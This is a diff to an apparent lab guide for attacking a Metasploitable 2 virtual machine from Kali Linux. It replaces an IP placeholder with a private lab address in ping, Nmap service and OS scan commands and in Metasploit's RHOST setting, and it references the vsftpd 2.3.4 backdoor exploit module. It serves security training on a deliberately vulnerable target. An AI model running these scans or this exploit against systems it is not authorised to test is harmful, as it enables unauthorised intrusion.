@@ -41,7 +41,7 @@ ifconfig
 **On Kali Linux:**
 
 ```bash
-ping <Metasploitable_IP>
+ping 192.168.42.136
 ```
 
 Verify that both machines can communicate with each other.
@@ -51,7 +51,7 @@ Verify that both machines can communicate with each other.
 Use Nmap to identify open ports, running services, and operating system details.
 
 ```bash
-nmap -sS -sV -O <Metasploitable_IP>
+nmap -sS -sV -O 192.168.42.136
 ```
 
 ### Step 4: Save Nmap Results
@@ -59,7 +59,7 @@ nmap -sS -sV -O <Metasploitable_IP>
 Save the scan results into a text file for documentation.
 
 ```bash
-nmap -sS -sV -O -oN metasploitable_scan.txt <Metasploitable_IP>
+nmap -sS -sV -O -oN metasploitable_scan.txt 192.168.42.136
 ```
 
 ### Step 5: Launch Metasploit
@@ -91,7 +91,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 Configure the IP address of the Metasploitable 2 machine.
 
 ```bash
-set RHOST <Metasploitable_IP>
+set RHOST 192.168.42.136
 ```
 
 ### Step 9: Set the Target Port
